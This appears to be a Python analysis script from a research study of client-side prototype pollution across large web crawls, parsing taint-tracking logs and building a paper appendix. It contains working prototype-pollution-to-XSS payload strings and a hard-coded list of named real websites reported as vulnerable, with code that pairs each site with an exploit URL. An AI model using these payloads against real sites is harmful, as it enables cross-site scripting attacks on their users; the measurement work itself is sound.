#from storage_match_utils import traverse_object
#from match_configs import CONFIG
#from try_match import read_and_match, get_replacement
#from all_vul_websites import vulnerability_to_website
#from generate_exploits import dict_element_refactor
#import all_vul_websites
from pprint import pprint
from urllib.parse import urlparse, unquote_plus
from datetime import date
import json, ast, os, glob, codecs, re, logging, multiprocessing, pyperclip
from tqdm import tqdm

def setup_logger(logger_name, log_file, level=logging.INFO):
    log_setup = logging.getLogger(logger_name)
    formatter = logging.Formatter('%(levelname)s: %(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
    fileHandler = logging.FileHandler(log_file, mode='a')
    fileHandler.setFormatter(formatter)
    log_setup.setLevel(level)
    log_setup.addHandler(fileHandler)
    
setup_logger("pp", "./list_ppFOUND_fast.log")
pp_logger = logging.getLogger("pp")

def test_traverse_object():
    object_aa = {
        'aa': {
            'bb': {
                'cc': {
                    'dd': 'ee'
                }, 
                'key1': {
                    'key2': 'value'
                }
            }
        }, 
        '1':1
    }
    target = 'key1'
    found_object, is_found = traverse_object(object_aa, target)
    print(is_found)
    found_object[get_replacement('key1', 'Message')] = {get_replacement('key2', 'Message'): get_replacement('value', 'Message')}
    found_object["constructor"] = {"prototype": {get_replacement('key2', 'Message'): get_replacement('value', 'Message')}}
    pprint(object_aa)
    print(json.dumps(object_aa))

def find_string_in_file(stem=CONFIG.stem, file_name_pattern='.py', target_str='vul_to_url_websites_pattern1_0to600kplus'):
    target_list = []
    for file_name in tqdm(os.listdir(stem)):
        if file_name_pattern in file_name and os.stat(os.path.join(stem, file_name)).st_size != 0:
            with open(os.path.join(stem, file_name), 'r') as f:
                content = f.read()
                if target_str in content:
                    target_list.append(file_name.rstrip(file_name_pattern))
    return target_list

def find_target_file_list(dirs):
    file_name_pattern='_log_file'
    target_str='ppFOUND'
    for file_name in dirs:
        if file_name_pattern in file_name: # and os.stat(os.path.join(stem, file_name)).st_size != 0:
            with open(os.path.join(CONFIG.stem, CONFIG.check_pp_log_dir, file_name), 'r') as f:
                content = f.read()
                if target_str in content:
                    pp_logger.info(file_name)

def refactor_stat_log_file(fpath:str, site_set_idx=3):
    with open(fpath, 'r') as f:
        contents = f.read()
        dictionary = ast.literal_eval(contents)
    # pprint(dict_element_refactor(dictionary))

    # url_search_list = dictionary['UnknownTaintError:12']['UnknownTaintError:12']['UnknownTaintError:12'][-1]
    # url_list = dictionary['Url']['Url']['Url'][-1]
    vul_list = []
    with open('vul_to_url_websites_pattern1_0to600kplus.txt', 'r') as f:
        for line in f.read().split('\n'):
            site = line.split(',')[-1]
            vul_list.append(site)
    # url_vul_list = [each for each in url_list if each in vul_list]
    # fp_list = [each for each in url_list if each not in vul_list]
    # with open('url_0to600kplus_fp.txt', 'w') as out:
    #     out.write('\n'.join(fp_list) + '\n')
    # fn_list = [each for each in vul_list if each not in url_list]
    # with open('url_0to600kplus_fn.txt', 'w') as out:
    #     out.write('\n'.join(fn_list) + '\n')
    # print(len(url_list), len(url_vul_list), len(fp_list))

    site_list_regroup_set = set()
    for key1_type in dictionary.keys():
        for key2_type in dictionary[key1_type].keys():
            for value_type in dictionary[key1_type][key2_type].keys():
                site_set = dictionary[key1_type][key2_type][value_type][site_set_idx]
                # site_list = [each for each in vul_list if each in site_set]
                site_list = [each for each in site_set if each not in vul_list]
                site_list_regroup_set = site_list_regroup_set.union(site_list)
                if site_list:
                    print((key1_type, key2_type, value_type), len(site_list), site_list)
    print(len(vul_list), len(site_list_regroup_set), [each for each in vul_list if each not in site_list_regroup_set])
    with open(os.path.join(CONFIG.stem, '42_websites_url_src_to_pp_again_0to600kplus.txt'), 'w') as ff:
        websites_to_pp = '\n'.join([str(idx+1)+','+each for idx,each in zip(range(len(site_list_regroup_set)),site_list_regroup_set)])
        ff.write(websites_to_pp)

def read_from_storage_data_js(fpath, write_path):
    import json
    with open(fpath, 'r') as fp:
        json1_str = fp.read()
        json1_str=json1_str.replace('var data_to_change =','')
        json1_str=json1_str.rstrip(';')
        json1_data = json.loads(json1_str)
        website_list = list(json1_data.keys())
    websites_to_pp = '\n'.join([str(idx+1)+','+each for idx,each in zip(range(len(website_list)),website_list)])
    with open(write_path, 'w') as fw:
        fw.write(websites_to_pp)
    print('len(website_list): ', len(website_list))

def split_same_diff_msg_origin(fpath):
    with open(fpath, 'r') as fp:
        contents = fp.read()
        msg_dict = ast.literal_eval(contents[len('var data_to_change = '):-1])
    count_dict = {}
    for kk, vv in msg_dict.items():
        msg_origin = vv[0][0]
        if msg_origin not in count_dict.keys():
            count_dict[msg_origin] = []
        count_dict[msg_origin].append(kk)
    pprint(count_dict)

def refactor_msg_data(receiver_path, origin_and_message_write_path, origin_write_path):
    origin_refactor_dict = {
        'https://fast.wistia.net': 'https://auth.wistia.com/session/new?app=wistia', 
        'http://fast.wistia.net': 'https://auth.wistia.com/session/new?app=wistia'
    }
    with open(receiver_path, 'r') as fr:
        contents = fr.read()
        msg_dict = ast.literal_eval(contents[len('var data_to_change = '):-1])
    new_dict, origin_set = {}, set()
    for receiver, msg_info in msg_dict.items():
        for origin, receive_url, msg_str in msg_info:
            # replace the origin name with the 'real' origin name
            if origin in origin_refactor_dict.keys():
                origin = origin_refactor_dict[origin]
            elif 'wistia' in origin:
                print('Weird origin '+origin)
            elif '/' not in origin.replace('https://', '').replace('http://', ''):
                origin = origin + '/'

            origin_set.add(origin)
            if origin not in new_dict.keys():
                new_dict[origin] = {}
                # <receiver>:  {'url': [<receiver_url>], 'message': [<msg_str>]} * n 
            if receiver not in new_dict[origin].keys():
                new_dict[origin][receiver] = {'url':[], 'message':[]}
            receive_url = receive_url.split('/?')[0].rstrip('/') # + '/?__proto__[testk]=testv&__proto__.testk=testv&constructor[prototype][testk]=testv'
            if receive_url not in new_dict[origin][receiver]['url']:
                new_dict[origin][receiver]['url'].append(receive_url)
            if len(new_dict[origin][receiver]['message']) <= 10 and msg_str not in new_dict[origin][receiver]['message']:
                new_dict[origin][receiver]['message'].append(msg_str)

    max_length_dict = {}
    for k1, v1 in new_dict.items():
        temp_list = []
        for k2, v2 in v1.items():
            temp_list.append(len(v2['url'])*(10 + len(v2['message'])*2))
        max_length_dict[k1] = sum(temp_list) #max(temp_list)
    print(max_length_dict)
    print(max(max_length_dict.values()), min(max_length_dict.values()), sum(max_length_dict.values())/float(len(max_length_dict.values())))
    with open(origin_and_message_write_path, 'w') as fo:
        fo.write('var data_to_change = ' + str(new_dict))
    with open(origin_write_path, 'w') as fw:
        fw.write('\n'.join([str(idx+1)+','+each[0]+','+str(60+each[1]) for idx,each in zip(range(len(max_length_dict)),max_length_dict.items())]))
        # the number 6 should change according to new-content.js in postMessage extension

def check_consequence(target_str='', mode='URL', have_site_check_list=False, have_verified_vul_list=False, strict_check_mode=True):
    # If the injected payload is only "testk" and "testv", strict_check_mode is True; otherwise False
    from all_vul_websites import vul_sites
    from verified_vul_list import verified_list
    sinktype_pattern = re.compile('sinkType = (.*),')
    content_pattern = re.compile('content = "(.*)",')
    consq = {'All':[0,0,set()]}
    consq_sub = {'All':0}
    prev_pos = 0
    TARGET_CRAWL = target_str + "crawl"
    from check_ppExploit_results_additional import result_site_dict
    check_site_list = result_site_dict['ppExploitFOUND'][1]
    # check_site_list = all_vul_websites.URL_vul_sites if mode=='URL' else all_vul_websites.vul_sites[mode]
    # os.chdir('/home/zfk/temp/cookie') #Documents/sanchecker/record_new_check_pp_pattern1_0to600kplus_crawl')
    os.chdir('/home/zfk/Documents/sanchecker/record_' + TARGET_CRAWL)
    vul_website = set()
    for fpath in glob.glob("*"):
        if "record_" in fpath:
            with codecs.open(fpath, mode='r') as ff:
                cont = ff.readlines()
                z = fpath.split('_')
                site = '.'.join(z[1:len(z)-3])
                if have_site_check_list and site not in check_site_list:
                    continue
                # list_cont_to_search = []
                for num, line in enumerate(cont, 1):
                    if 'targetString = (' in line:
                        prev_pos = num
                    # if 'content = "' in line:
                    #     list_cont_to_search.append(line)
                    elif 'sinkType = ' in line and 'sinkType = prototypePollution' not in line and 'sinkType = xmlhttprequest' not in line:
                        
                        if 'content = "' in cont[num - 3]:
                            contents_to_search = ''.join(cont[prev_pos + 1 : num - 2])
                        else:
                            contents_to_search = ''.join(cont[prev_pos + 1 : num - 3])
                        # contents_to_search = ''.join(list_cont_to_search)
                        # list_cont_to_search = []
                        if contents_to_search:
                            content_result = content_pattern.finditer(contents_to_search)
                        # if content_result:
                            content = ''.join([m.groups()[0] for m in content_result])
                            
                            sinktype_result = sinktype_pattern.search(line)
                            if sinktype_result:
                                sinkType = sinktype_result[1]
                            else:
                                raise ValueError('{} Cannot find sinkType! Line {} {}'.format(site, num, line))
                                continue
                            judge, consequence, sinkType = judge_if_valid(content, sinkType, mode=mode, strict_check_mode=strict_check_mode)
                            if judge:
                                # found
                                assert len(consequence) and len(sinkType)
                                if have_verified_vul_list and consequence in ['xss', 'setTaintAttribute']:
                                    
                                    if site not in verified_list:
                                        continue
                                
                                if sinkType not in consq.keys():
                                    consq[sinkType] = [[], 0, set()]
                                consq[sinkType][1] += 1
                                consq[sinkType][2].add(site)
                                # consq[sinkType][0].append('{} {} {}'.format(site, num, content))
                                consq['All'][1] += 1
                                consq['All'][2].add(site)

                                if consequence not in consq_sub.keys():
                                    consq_sub[consequence] = [0, set(), []]
                                consq_sub[consequence][0] += 1
                                consq_sub[consequence][1].add(site)
                                consq_sub[consequence][2].append('{} {} {}'.format(site, num, content))
                                consq_sub['All'] += 1

                                vul_website.add(site)
                        else:
                            raise ValueError('{} Cannot find content! Line {} {}'.format(site, num-3, cont[ num - 3]))
                            
    should_verify = {}
    consq['All'][0] = vul_weighted_sum(consq['All'][2])
    for kk,vv in consq.items():
        if kk != 'All':
            consq[kk][0] = vul_weighted_sum(vv[2])
            if kk == 'html':
                exploit = [
                    "__proto__[98765]=<script>console.log(67890)</script>", 
                    "__proto__[98765]=<img/src/onerror%3dconsole.log(67890)>", 
                    "__proto__[98765]=<img src=1 onerror=console.log(67890)>", 
                    "__proto__[98765]=javascript:console.log(67890)//",
                    "constructor[prototype][98765]=<script>console.log(67890)</script>", 
                    "constructor[prototype][98765]=<img/src/onerror%3dconsole.log(67890)>", 
                    "constructor[prototype][98765]=<img src=1 onerror=console.log(67890)>", 
                    "constructor[prototype][98765]=javascript:console.log(67890)//"
                ]
            elif kk == 'javascript':
                exploit = [
                    "__proto__[98765]=console.log(67890)//", 
                    "constructor[prototype][98765]=console.log(67890)//",  
                ]
            elif kk == 'setTaintAttribute':
                exploit = [
                    "__proto__[98765]=data:,console.log(67890)//", 
                    "__proto__[src]=data:,console.log(67890)//", 
                    "__proto__[url]=data:,console.log(67890)//&__proto__[dataType]=script&__proto__[crossDomain]=", 
                    "__proto__[srcdoc][]=<script>console.log(67890)</script>", 
                    "__proto__[onload]=console.log(67890)//&__proto__[src]=1&__proto__[onerror]=console.log(67890)//", 
                    "constructor[prototype][98765]=data:,console.log(67890)//",  
                    "constructor[prototype][src]=data:,console.log(67890)//", 
                    "constructor[prototype][url]=data:,console.log(67890)//&constructor[prototype][dataType]=script&constructor[prototype][crossDomain]=", 
                    "constructor[prototype][srcdoc][]=<script>console.log(67890)</script>", 
                    "constructor[prototype][onload]=console.log(67890)//&constructor[prototype][src]=1&constructor[prototype][onerror]=console.log(67890)//"
                ]
            else:
                continue
            should_verify[kk] = [vv[2], exploit]
    for kk,vv in consq_sub.items():
        if kk != 'All':
            consq_sub[kk][1] = vul_weighted_sum(vv[1])

    # pprint(consq)
    with open('/home/zfk/Documents/sanchecker/src/' + 'should_verify_new_vul.py', 'w') as fw:
        fw.write('should_verify=' + str(should_verify))
    with open('/home/zfk/Documents/sanchecker/src/' + date.today().strftime("%m_%d_") + TARGET_CRAWL + '_consequence.log', 'w') as f1: #0614_consequence_cookie.log, 0609_consequence_0to600kplus.log
        pprint(consq, f1)
        pprint(consq_sub, f1)
    print(len(vul_website), vul_weighted_sum(vul_website), vul_website)

def vul_weighted_sum(site_list):
    all_counts = 0
    for each_site in site_list:
        for count, vv in vulnerability_to_website.items():
            if each_site in vv:
                all_counts += int(count)
        else:
            all_counts += 1
    return all_counts

consq_dict = {
        'anchorSrcSink': 'query', 
        'cookie': 'cookie', 
        'html': 'xss', 
        'javascript': 'xss', 
        'iframeSrcSink': 'query',
        'imgSrcSink': 'query',
        'scriptSrcUrlSink': 'query'
}
k_v_dict = {
    'URL': '98765=testv', 
    'Message': 'Message_testk=Message_testv', 
    'Cookie': 'Cookie_testk=Cookie_testv'
}
blacklist = ('__proto__[testk]=testv&__proto__.testk=testv&constructor[prototype][testk]=testv&__proto___testk=testv&' + \
    '__proto__[testk]&__proto__.testk&constructor[prototype][testk]&__proto___testk').split('&')
                        
def judge_if_valid(content, sinkType, mode='URL', strict_check_mode=False):
    
    EXCLUDE_CONTENT_LIST = ['__proto__[testk]', '__proto__[onload]', '__proto__[98765]', '__proto__.98765', '__proto___98765', 'constructor[prototype]['] # update before running the script
    temp_content = content
    counter = 0
    while '%' in temp_content and counter < 10:
        temp_content = unquote_plus(temp_content)
        counter += 1
    if strict_check_mode:
        for each in blacklist:
            temp_content = temp_content.replace(each, '')
        # if (not ('testk' in temp_content or 'testv' in temp_content or 'loginStatus' in temp_content)): # or any([each for each in blacklist if each in temp_content]): 
        if not ('testk' in temp_content or 'testv' in temp_content):
            return False, '', ''
    
    if sinkType not in consq_dict.keys():
        consq_dict[sinkType] = sinkType
    consequence = consq_dict[sinkType]
    k_v_str = k_v_dict[mode]
    if consequence == 'query':
        if '%' in content:
            content = temp_content #unquote_plus(unquote_plus(content))
        outs = urlparse(content)
        if not outs.netloc and not outs.path:
            # raise ValueError('{} is not query!'.format(content))
            print(('ValueError {} is not query!'.format(content)))
        q_list = outs.query.split('&')
        if mode == 'Cookie':
            if k_v_str in q_list or 'loginStatus=login' in q_list or content.find('__proto__') == -1 \
                or content.find(k_v_str.split('=')[1]) < content.find('__proto__'):
                return True, consequence, sinkType
            else:
                return False, consequence, sinkType
        else:
            if k_v_str in q_list:
                return True, consequence, sinkType
            elif (k_v_str.split('=')[0] in content or k_v_str.split('=')[1] in content) \
                and all(each not in temp_content for each in EXCLUDE_CONTENT_LIST):
                    # (content.find('__proto__') == -1 or \
                    # content.find(k_v_str.split('=')[1]) < content.find('__proto__')):
                # TODO: the criteria for query could change
                num_pattern = r"((?:\d+98765\d*)|(?:\d*98765\d+))"
                judge = re.search(num_pattern, content)
                return not judge, consequence, sinkType
            else:
                return False, consequence, sinkType
    elif consequence == 'xss':
        # TODO: generate exploit strings

        # Not perfect criterion: '%', an indicator of encoding
        if '%' in content or all(each in content for each in ("'", '&#39;')) or all(each in content for each in ('"', '&quot;')):
            return False, '', sinkType
        # Currently, cases are rare, so simply return True
        # counter = 0
        # while '%' in temp_content and counter < 10:
        #     temp_content = temp_content.encode('utf-8').decode('unicode_escape')
        #     counter += 1
        if any(each in temp_content for each in ['testv', 'console.log("5eRyG0od")', '5eRyG0od']) and \
            all(each not in temp_content for each in EXCLUDE_CONTENT_LIST):
            print(sinkType, temp_content)
            return True, consequence, sinkType
        else:
            return False, consequence, sinkType
    elif consequence == 'cookie':
        # judge direct or indirect manipulation
        if any(k_v_str in ee and all(each not in ee for each in EXCLUDE_CONTENT_LIST) for ee in content.replace(' ', '').split(';')):
            return True, 'direct-cookie', sinkType
        else:
            if '%' in content:
                content = temp_content # unquote_plus(unquote_plus(content))
            
            if mode == 'Cookie':
                pattern = r"[^a-zA-Z]Cookie_testk[^a-zA-Z]+Cookie_testv[^a-zA-Z]"
            elif mode == 'Message':
                pattern = r"[^a-zA-Z]Message_testk[^a-zA-Z]+Message_testv[^a-zA-Z]"
            else:
                pattern = r"98765.*testv" #r"[^a-zA-Z]98765[^a-zA-Z]+testv[^a-zA-Z]"
            judge = re.search(pattern, content) #.groups()
            # if judge:
            #     judge = not re.search(pattern, content)
            return not not judge and all(each not in content for each in EXCLUDE_CONTENT_LIST), 'indirect-cookie', sinkType
    else:
        # TODO: other types
        
        if any(each in temp_content for each in ['testv', 'console.log("5eRyG0od")', '5eRyG0od']) and \
            all(each not in temp_content for each in EXCLUDE_CONTENT_LIST):
            print(sinkType, temp_content)
            return True, consequence, sinkType
        else:
            return False, consequence, sinkType
        # print(sinkType, temp_content)
        # return True, consequence, sinkType

def get_verified_vul_list(dir):
    target_pattern = r"INFO:CONSOLE.*\"67890\", source"
    exploit_pattern = r"\"ppExploitFOUND (.*?)\""
    site_pattern = r"(.*)_\d+_log_file"
    verified_list = set()
    exploit_dict = {}
    for each_file in tqdm(os.listdir(dir)):
        if 'log_file' in each_file:
            matchs = re.search(site_pattern, each_file)
            if matchs:
                this_site = matchs[1].replace('_', '.' ,1)
            else:
                raise ValueError
            cur_exploit = ''
            need_exploit_flag = False
            with open(dir + '/' + each_file, 'r') as fr:
                # contents = fr.read()
                # target_matchs = re.search(target_pattern, contents)
                # if target_matchs:
                #     verified_list.add(this_site)
                #     continue
                # elif '"67890"' in contents:
                #     print(this_site)
                contents = fr.readlines()
                for line in contents:
                    exploit_matchs = re.search(exploit_pattern, line)
                    if exploit_matchs and exploit_matchs[0]:
                        cur_exploit = exploit_matchs[1]
                        if need_exploit_flag:
                            exploit_dict[this_site] = cur_exploit
                            break
                        continue
                    target_matchs = re.search(target_pattern, line)
                    if target_matchs and target_matchs[0]:
                        if not cur_exploit:
                            need_exploit_flag = True
                            continue
                        exploit_dict[this_site] = cur_exploit
                        break
    # with open('/home/zfk/Documents/sanchecker/src/' + 'verified_vul_list.py', 'w') as fw:
    #     fw.write('verified_list=' + str(verified_list))
    
    xss_site_list = '''acttheatre.org, aprilskin.com, balance-on.com, boulderboats.com, boxx.com, brownsheavyequipment.com, cestujlevne.com, euronaval.fr, fieldtriphealth.com, getpelegant.com, gettommys.com, hireright.com, inkdata.cn, kozehealth.com, leejiral.com, mamapedia.com, mebelvia.ru, medifast1.com, miabellebaby.com, mikurestaurant.com, modernonmonticello.com, oxessays.com, paperfellows.com, percussion.com, popularresistance.org, pro-salesinc.com, psychologytomorrowmagazine.com, ririnco.com, rizknows.com, rstudio.org, smallforbig.com, talentera.com, timeblock.ru, timsykeswatchlist.com, tipsfromatypicalmomblog.com, toosmall.org, wearpact.com, westmarine.com, whatsinthebible.com'''\
        .split(', ')
    connect0 = "& \\begin{minipage}{0.3\\textwidth}\\tiny \\hli{} \\begin{verbatim}"
    connect1 = "\\end{verbatim}\\end{minipage} \\\\"
    suffix = "?__proto__[src]=data:,alert('XSS')//"
    # generate appendix
    append_list = []
    for site in xss_site_list:
        if site in exploit_dict.keys():
            append_list.append(site + connect0 + \
                exploit_dict[site].replace('console.log', 'alert').replace('67890', '\'XSS\'').replace('98765', '1')+\
                    connect1)
        else:
            append_list.append(site + connect0 + \
                'https://' + site + suffix + \
                    connect1)
    appendix = '\n'.join(append_list)
    # pyperclip.copy(appendix)
    with open('xss_appendix.txt', 'w') as fw:
        fw.write(appendix)

allow_no_load_time_set = set()

def get_show_time(fpath, time_write_file, recrawl_write_file, mode='add'):
    load_time_dict = {}
    site_to_recrawl = set()
    for each_file in os.listdir(os.path.join("/media/datak/inactive/sanchecker/src", fpath)):
        if 'log_file' in each_file:
            with open(os.path.join(CONFIG.stem, fpath, each_file), 'r') as fr:
                site = each_file.replace('_log_file', '').replace('_', '.', 1)
                for line in fr.readlines():
                    # if 'Codes for showing loading time in' in line:
                    matchs = re.search(r'Loading time for (.*) is: (.*)", source:', line)
                    if matchs:
                        load_time = int(matchs.group(2))
                        load_time_dict[site] = load_time
                        break
                else:
                    if mode == 'add':
                        allow_no_load_time_set.add(site)
                    elif mode == 'check' and site not in allow_no_load_time_set:
                        site_to_recrawl.add(site)
    if mode == 'add':
        print(fpath, len(allow_no_load_time_set))
    else:
        print(fpath, len(site_to_recrawl))
    with open(os.path.join(CONFIG.stem, time_write_file), 'a') as fw:
        fw.write(str(load_time_dict)+',\n')
    if mode == 'check':
        with open(os.path.join(CONFIG.stem, recrawl_write_file), 'w') as fwr:
            for idx, each_line in zip(range(1, len(site_to_recrawl)+1), site_to_recrawl):
                fwr.write(str(idx)+','+each_line+'\n')

def get_rankings_from_site_list(write_file):
    from all_vul_websites import vul_sites
    from check_ppExploit_results_additional import result_site_dict
    vul_site_list = result_site_dict[CONFIG.ppExploitFOUND_str][1]\
        .union({j for i in vul_sites.values() for j in i})
    write_list = set()
    site_rank = {}
    target_list = 'acttheatre.org, aprilskin.com, balance-on.com, boulderboats.com, boxx.com, brownsheavyequipment.com, cestujlevne.com, euronaval.fr, fieldtriphealth.com, getpelegant.com, gettommys.com, hireright.com, inkdata.cn, kozehealth.com, leejiral.com, mamapedia.com, mebelvia.ru, medifast1.com, miabellebaby.com, mikurestaurant.com, modernonmonticello.com, oxessays.com, paperfellows.com, percussion.com, popularresistance.org, pro-salesinc.com, psychologytomorrowmagazine.com, ririnco.com, rizknows.com, rstudio.org, smallforbig.com, talentera.com, timeblock.ru, timsykeswatchlist.com, tipsfromatypicalmomblog.com, toosmall.org, wearpact.com, westmarine.com, whatsinthebible.com'\
        .split(', ')
    with open(os.path.join(CONFIG.stem, 'tranco_3Z3L.csv'), 'r') as fr:
        for line in fr.readlines():
            rank, site = line.split(',')
            site = site.rstrip('\n')
            # for source_type, vul_site_list in vul_sites.items():
            if site in target_list: #vul_site_list:
                site_rank[site] = rank
                # log_file_name = site.replace('.', '_', 1) + '_log_file'
                # write_list.add(log_file_name + '==>' + rank + '\n')
                    # for key, value_set in vul_rankings.items():
                    #     if key in source_type:
                    #         vul_rankings[key].add(rank)
    # with open(os.path.join(CONFIG.stem, write_file), 'w') as fw:
    #     for each in write_list:
    #         fw.write(each)
    top, bottom, count = 1, 100000, 0
    tmp = ''
    for k,vv in site_rank.items():
        v = int(vv)
        if top <= v <= bottom:
            print(v, k)
            count += 1
    print(count)

def generate_appendix(cols=3):
    from consequence_url_0to1m import detail_conseq
    from new_additional_consequence import conseq
    from all_vul_websites import vul_sites
    output_str = ''
    scanned_site_set = set()
    conseq_site_dict = {}
    it = 0

    # pre-process detail_conseq and conseq
    for consq in [detail_conseq, conseq]:
        for each_key, each_val in consq.items():
            if 'cookie' in each_key:
                target_type = 'Cookie-M'
            elif 'query' in each_key:
                target_type = 'URL-M'
            elif 'xss' in each_key or 'setTaintAttribute' in each_key:
                target_type = 'XSS'
            else:
                continue
            for detail in each_val[-1]:
                matchs = re.search(r'^(.*?) \d', detail)
                site = matchs.group(1)
                if target_type not in conseq_site_dict.keys():
                    conseq_site_dict[target_type] = set()
                conseq_site_dict[target_type].add(site)
    for t,s in conseq_site_dict.items():
        s_list = sorted(list(s))
        print(t, ', '.join(s_list[:-1]) + ' and ' + s_list[-1] + '. ')
        print('\n-------------------------\n')
    #             if site not in conseq_site_dict.keys():
    #                 conseq_site_dict[site] = set()
    #             conseq_site_dict[site].add(target_type)

    # site_list = sorted([each for each_list in vul_sites.values() for each in each_list])
    # for site_list in vul_sites.values():
    # for each_site in site_list:
    #     if each_site in scanned_site_set:
    #         continue
    #     it += 1
    #     output_str += each_site + ' & '
        
    #     scanned_site_set.add(each_site)
    #     if each_site in conseq_site_dict.keys():
    #         each_conseq = ', '.join(conseq_site_dict[each_site])
    #     else:
    #         each_conseq = '-'
    #     terminator = ' \\\\\n' if it % cols == 0 else ' & '
    #     output_str += each_conseq + terminator

    # print(output_str)
    # print(it)

def find_missing_file(fpath, txt_file):
    prefix = "record_"
    files_to_check = []
    with open(txt_file, 'r') as f:
        content = f.read()
        for each in content.split('\n'):
            files_to_check.append(prefix + each)

    for each in os.listdir(fpath):
        if prefix not in each:
            continue
        if each in files_to_check:
            files_to_check.remove(each)
        else:
            print(each)

    print(files_to_check)

def count_lines_py(fpath='./', whitelist=None, blacklist=None):
    count_py = 0
    for each_file in os.listdir(os.path.join(CONFIG.stem, fpath)):
        if any(each in each_file for each in whitelist) and all(each not in each_file for each in blacklist):
            print(each_file)
            with open(os.path.join(CONFIG.stem, fpath, each_file), 'r') as fr:
                for each_line in fr.readlines():
                    if each_line.replace(' ', '').startswith('#'):
                        continue
                    count_py += 1
    print(f'Count {whitelist}: ', count_py)

def count_lines_js(fpath_list, whitelist=None, blacklist=None):
    count_js = 0
    for each_path in fpath_list:
        for each_file in os.listdir(each_path):
            if any(each in each_file for each in whitelist) and all(each not in each_file for each in blacklist):
                print(each_file)
                with open(os.path.join(each_path, each_file), 'r') as fr:
                    for each_line in fr.readlines():
                        count_js += 1
    print(f'Count {whitelist}: ', count_js)

def count_vulnerabilities():
    from all_vul_websites import vul_sites, vulnerability_to_website
    website_set = set()
    vuln_count = {each_key:0 for each_key in vul_sites.keys()}
    for each_key, site_list in vul_sites.items():
        for each_site in site_list:
            if each_site in website_set:
                continue
            website_set.add(each_site)
            for counts, vul_site_list in vulnerability_to_website.items():
                if each_site in vul_site_list:
                    vuln_count[each_key] += int(counts)
                    break
            else:
                vuln_count[each_key] += 1
    print(sum(list(vuln_count.values())))
    print(vuln_count)

def write_to_blackfan_to_pp(fpath, start_idx, end_idx, mode='w', port=8000):
    # Including both start_idx and end_idx. 
    # Output format: 
    # idx,http://127.0.0.1:port/idx_index.html?__proto__[testk]=testv&__proto__.testk=testv&constructor[prototype][testk]=testv
    query = "?__proto__[testk]=testv&__proto__.testk=testv&constructor[prototype][testk]=testv"
    html = "_index.html"
    serve = "http://127.0.0.1"
    context = '\n'.join([f"{idx},{serve}:{port}/{idx}{html}{query}" for idx in range(start_idx, end_idx + 1)])
    with open(fpath, mode=mode) as fp:
        fp.write(context)

if __name__ == "__main__":
    # write_to_blackfan_to_pp(fpath=os.path.join(CONFIG.stem, "blackfan_to_pp.txt"), start_idx=1, end_idx=55)
    # test_traverse_object()
    # get_verified_vul_list('/home/zfk/Documents/sanchecker/src/'+'verify_conseq_new_vul_logs')
    # from new_generate_list_to_capnp import TARGET_STR
    # check_consequence(TARGET_STR, have_verified_vul_list=True, strict_check_mode=False)
    # generate_appendix()
    # count_lines_js(CONFIG.js_path_list, whitelist=['.js'], blacklist=['data', '.json', 'backup', 'old'])
    # blacklist_py = ['_count', 'consequence_url_0to1m.py', 'load-time', '0623', '0705', 
    #                 '0621', '0630', '0702', '0714', '0716', '0723', 'vul', 'additional', '1211', '1212', 
    #                 'vul_list', 'should_verify_new_vul.py', 'rest_files_to_check_pp.py']
    # count_lines_py(whitelist=['.py'], blacklist=blacklist_py)
    # count_vulnerabilities()
    # get_rankings_from_site_list('new_vul_sites_to_rankings.txt')
    get_show_time('show_load_time_legacy_chrome_1k_logs', 'load-time-legacy-chrome-1k.py', '', mode='add')
    get_show_time('show_load_time_Fastchrome_key1key2_1k_logs', 'load-time-Fastchrome-1k.py', 'recrawl-ppchrome-1k.txt', mode='check')
    get_show_time('show_load_time_Fastndss18_1k_logs', 'load-time-ndss18-1k.py', 'recrawl-ndss18-1k.txt', mode='check')
    get_show_time('show_load_time_gala_1k_logs', 'load-time-gala-1k.py', 'recrawl-gala-1k.txt', mode='check')

    # sub_dirs = [f for f in os.listdir(os.path.join(CONFIG.stem, CONFIG.check_pp_log_dir))]
    # n_threads = 20
    # slice_size = 64 #int(len(sub_dirs) / n_threads) + 1
    # task_list = [sub_dirs[i:i + slice_size] for i in range(0, len(sub_dirs), slice_size)]
    # print(f"Split into {len(task_list)} parts")
    # pool = multiprocessing.Pool(n_threads)
    # zip(*pool.map(find_target_file_list, task_list))
    # pool.close()
    # pool.join()
    
    # split_same_diff_msg_origin('/home/zfk/Documents/process-cookies/taintchrome/postMessage_extension/message_data.js')
    # read_from_storage_data_js('/home/zfk/Documents/process-cookies/taintchrome/cookie_storage_modify_extension/storage_data_new.js', \
    #     '/home/zfk/Documents/sanchecker/src/websites_to_pp_cookie_storage_0to1m.txt')
    # refactor_msg_data("/home/zfk/Documents/process-cookies/taintchrome/postMessage_extension/message_receiver_data.js", \
    #     "/home/zfk/Documents/process-cookies/taintchrome/postMessage_extension/msg-origin-data-new.js", 
    #     "/home/zfk/Documents/sanchecker/src/msg_origin_to_crawl.txt")
    # refactor_stat_log_file('/home/zfk/Documents/sanchecker/src/0623_proto_count_flow_0to600kplus.py')
    # find_missing_file('/home/zfk/Documents/sanchecker/record_new_check_pp_pattern1_0to600kplus_crawl', '/home/zfk/Documents/sanchecker/src/vul_to_url_websites_cleaned_0to600kplus.txt')

#     print(temp.count('__proto__'), temp.count('HTMLDivElement'), temp.count('HTMLIFrameElement'))
